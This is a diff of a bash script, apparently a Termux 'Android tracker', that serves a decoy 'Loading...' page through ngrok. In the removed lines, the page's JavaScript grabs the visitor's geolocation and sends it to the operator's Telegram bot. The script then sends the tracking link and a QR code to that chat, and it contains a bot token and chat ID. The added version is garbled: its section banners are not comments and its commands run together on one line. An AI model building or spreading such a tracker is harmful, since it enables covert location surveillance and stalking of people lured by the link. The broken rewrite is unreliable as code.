@@ -1,54 +1,38 @@
 #!/bin/bash
 
-# YASIN-ANDROID-TRACKER
-# Created by Md Yasin Arafat
+======================= CONFIG =======================
 
-BOT_TOKEN="8128619794:AAGhkVx-64tgJeoSXB_VDSQk7LnZaOECJcI"
-CHAT_ID="5548654620"
+BOT_TOKEN="8128619794:AAGhkVx-64tgJeoSXB_VDSQk7LnZaOECJcI" CHAT_ID="5548654620" PORT=8888
 
-GREEN='\033[1;32m'
-NC='\033[0m'
+==================== SETUP SECTION ===================
 
-echo -e "${GREEN}[+] Installing dependencies...${NC}"
-pkg update -y
-pkg install -y curl termux-api php unzip jq
+echo -e "\e[32m[+] Installing dependencies...\e[0m" pkg update -y &>/dev/null pkg install php curl jq termux-api unzip -y &>/dev/null
 
-echo -e "${GREEN}[+] Checking ngrok...${NC}"
-if [ ! -f "$PREFIX/bin/ngrok" ]; then
-  echo -e "${GREEN}[+] Installing ngrok...${NC}"
-  curl -O https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
-  unzip ngrok-stable-linux-arm.zip
-  mv ngrok $PREFIX/bin/
-  chmod +x $PREFIX/bin/ngrok
-fi
+================== START LOCAL SERVER =================
 
-echo -e "${GREEN}[+] Starting local server...${NC}"
-mkdir -p ~/trackserver
-cd ~/trackserver
-cat <<EOF > index.html
-<html><body><h2>Loading...</h2><script>
-navigator.geolocation.getCurrentPosition(function(pos){
-  fetch('https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=Location: ' + pos.coords.latitude + ', ' + pos.coords.longitude);
-});
-</script></body></html>
-EOF
+echo -e "\e[32m[+] Starting PHP server...\e[0m" nohup php -S 127.0.0.1:$PORT > /dev/null 2>&1 & sleep 2
 
-echo -e "${GREEN}[+] Starting PHP server and ngrok...${NC}"
-php -S 127.0.0.1:8888 > /dev/null 2>&1 &
-ngrok http 8080 > /dev/null 2>&1 &
-sleep 15
+===================== START NGROK =====================
 
-NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url')
-echo -e "${GREEN}[+] Ngrok URL generated:${NC} $NGROK_URL"
+echo -e "\e[32m[+] Starting ngrok...\e[0m" nohup ngrok http $PORT > /dev/null 2>&1 & sleep 5
 
-# Send link to Telegram
-curl -s "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=Your tracking link: $NGROK_URL"
+NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[] | select(.proto=="https") | .public_url')
 
-# Generate QR, save as image, send to Telegram
-QR_IMAGE="qr.png"
-curl -o "$QR_IMAGE" "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=$NGROK_URL"
-curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" \
--F chat_id="$CHAT_ID" \
--F photo=@"$QR_IMAGE"
+if [[ -z "$NGROK_URL" ]]; then echo -e "\e[31m[!] Failed to generate ngrok URL\e[0m" exit 1 fi
 
-echo -e "${GREEN}[+] Tracker is live. QR Code image sent via Telegram.${NC}"
+echo -e "\e[32m[+] Ngrok URL generated: $NGROK_URL\e[0m"
+
+===================== GENERATE QR =====================
+
+echo -e "\e[32m[+] Generating QR Code...\e[0m" echo "$NGROK_URL" | qrencode -o qr.png
+
+==================== SEND TO TELEGRAM =================
+
+echo -e "\e[32m[+] Sending QR and URL to Telegram...\e[0m" curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" 
+-F chat_id="$CHAT_ID" 
+-F photo="@qr.png" 
+-F caption="Tracker is live!\n\nLink: $NGROK_URL"
+
+======================= DONE ==========================
+
+echo -e "\e[32m[+] Tracker is live. QR Code & Link sent via Telegram.\e[0m"
